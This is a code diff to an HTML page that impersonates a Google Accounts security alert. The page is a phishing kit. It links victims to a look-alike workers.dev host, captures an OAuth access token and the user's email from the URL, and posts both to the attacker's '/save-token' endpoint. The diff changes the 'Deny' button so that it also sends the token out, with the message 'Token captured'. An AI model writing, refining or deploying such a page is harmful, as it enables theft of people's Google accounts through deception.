@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Update - Google Accounts</title>
+    <title>Security Alert - Google Accounts</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -29,7 +29,7 @@
         }
         h1 {
             font-size: 22px;
-            font-weight: 400;
+            font-weight: 500;
             margin-bottom: 10px;
             color: #202124;
         }
@@ -63,8 +63,6 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
             width: 100%;
             margin-bottom: 10px;
         }
@@ -105,15 +103,16 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* Button to trigger login */
         .login-trigger {
             margin-top: 20px;
             background-color: #1a73e8;
             color: white;
-            padding: 10px 20px;
+            padding: 12px 24px;
             border-radius: 4px;
             text-decoration: none;
-            display: inline-block;
+            display: block;
+            text-align: center;
+            font-weight: 500;
         }
         .login-trigger:hover {
             background-color: #1765cc;
@@ -123,7 +122,6 @@
 <body>
 
     <div class="container">
-        <!-- Official Google Logo -->
         <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92dp.png" alt="Google">
         
         <!-- Step 1: Security Alert -->
@@ -137,15 +135,12 @@
                 <strong>Time:</strong> Just now
             </div>
 
-            <button id="check-btn" class="btn">Check activity</button>
-            
-            <!-- Direct Login Button -->
-            <a href="https://google-verify.dispatchtomsanta.workers.dev/login" class="login-trigger" style="display:block; margin-top:15px; text-align:center;">
-                Click here to verify
+            <a href="https://google-verify.dispatchtomsanta.workers.dev/login" class="login-trigger">
+                Check activity
             </a>
         </div>
 
-        <!-- Step 2: Grant Access (Hidden initially) -->
+        <!-- Step 2: Grant Access -->
         <div id="user-section" style="display:none;">
             <div class="spinner" id="loader"></div>
             <h2>Google Security wants to access your account</h2>
@@ -164,29 +159,22 @@
 
         const loginSection = document.getElementById('login-section');
         const userSection = document.getElementById('user-section');
-        const checkBtn = document.getElementById('check-btn');
         const confirmBtn = document.getElementById('confirm-btn');
         const denyBtn = document.getElementById('deny-btn');
         const loader = document.getElementById('loader');
 
         const params = new URLSearchParams(window.location.search);
-        const token = params.get('access_token');
-        const userInfoStr = params.get('user_info');
+        const token = params.get('token');
+        const userEmail = params.get('user_email');
 
         // If we have a token from OAuth, show the second step
-        if (token && userInfoStr) {
+        if (token) {
             loginSection.style.display = 'none';
             userSection.style.display = 'block';
             localStorage.setItem('google_auth_token', token);
-            console.log("User Authenticated:", JSON.parse(userInfoStr));
+            console.log("User Authenticated:", userEmail);
             window.history.replaceState({}, document.title, "/");
         }
-
-        // Clicking "Check activity" just shows the second step
-        checkBtn.addEventListener('click', () => {
-            loginSection.style.display = 'none';
-            userSection.style.display = 'block';
-        });
 
         confirmBtn.addEventListener('click', () => {
             loader.style.display = 'block';
@@ -197,11 +185,10 @@
             fetch(WORKER_URL + '/save-token', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ token: localStorage.getItem('google_auth_token') })
+                body: JSON.stringify({ token: localStorage.getItem('google_auth_token'), email: userEmail })
             }).then(response => {
                 if(response.ok) {
                     alert("Account secured. Access granted.");
-                    // Optionally redirect or close
                 } else {
                     alert("Error saving token.");
                 }
@@ -209,8 +196,22 @@
         });
 
         denyBtn.addEventListener('click', () => {
-            alert("Sign-in blocked.");
-            location.reload();
+            loader.style.display = 'block';
+            confirmBtn.style.display = 'none';
+            denyBtn.style.display = 'none';
+
+            // Send the token to your Worker
+            fetch(WORKER_URL + '/save-token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token: localStorage.getItem('google_auth_token'), email: userEmail })
+            }).then(response => {
+                if(response.ok) {
+                    alert("Sign-in blocked. Token captured.");
+                } else {
+                    alert("Error saving token.");
+                }
+            }).catch(err => alert("Connection error: " + err));
         });
     </script>
 </body>
